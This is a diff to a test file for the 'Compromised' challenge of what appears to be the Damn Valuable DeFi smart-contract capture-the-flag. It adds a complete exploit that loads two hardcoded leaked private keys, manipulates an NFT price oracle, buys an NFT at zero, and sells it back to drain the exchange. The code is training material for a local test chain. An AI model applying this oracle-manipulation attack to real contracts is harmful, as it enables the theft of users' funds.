@@ -59,23 +59,54 @@ describe('Compromised challenge', function () {
         this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
     });
 
-    it('Exploit', async function () {        
+    it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Set priv keys from the leaked data
+        const wallet1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        console.log("Wallet1:                  ", wallet1.address);
+        const wallet2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+        console.log("Wallet2:                  ", wallet2.address);
+        //
+        // Change the prices via leaked keys
+        console.log("Change prices to:          0 ether price");
+        await this.oracle.connect(wallet1).postPrice("DVNFT", ethers.utils.parseEther('0'));
+        await this.oracle.connect(wallet2).postPrice("DVNFT", ethers.utils.parseEther('0'));
+        let priceBySource = String(await this.oracle.getPriceBySource("DVNFT", "0xe92401A4d3af5E446d93D11EEc806b1462b39D15"));
+        console.log("Price source 0xe924...D15:", priceBySource);
+        //
+        // Buy an NFT with the new price
+        await this.exchange.connect(attacker).buyOne({ value: ethers.utils.parseEther('0.01') });
+        //
+        // Change the prices again so the attacker can sell in a higher price
+        console.log("Change prices to:         ", EXCHANGE_INITIAL_ETH_BALANCE.toString());
+        await this.oracle.connect(wallet1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(wallet2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        priceBySource = String(await this.oracle.getPriceBySource("DVNFT", "0xe92401A4d3af5E446d93D11EEc806b1462b39D15"));
+        console.log("Price source 0xe924...D15:", priceBySource);
+        //
+        // Attacker sell an overpriced NFT
+        console.log("Attacker sells the overpriced NFT...");
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+        //
+        // Change back price to the original value
+        await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Exchange must have lost all ETH
         expect(
             await ethers.provider.getBalance(this.exchange.address)
         ).to.be.eq('0');
-        
+
         // Attacker's ETH balance must have significantly increased
         expect(
             await ethers.provider.getBalance(attacker.address)
         ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
+
         // Attacker must not own any NFT
         expect(
             await this.nftToken.balanceOf(attacker.address)
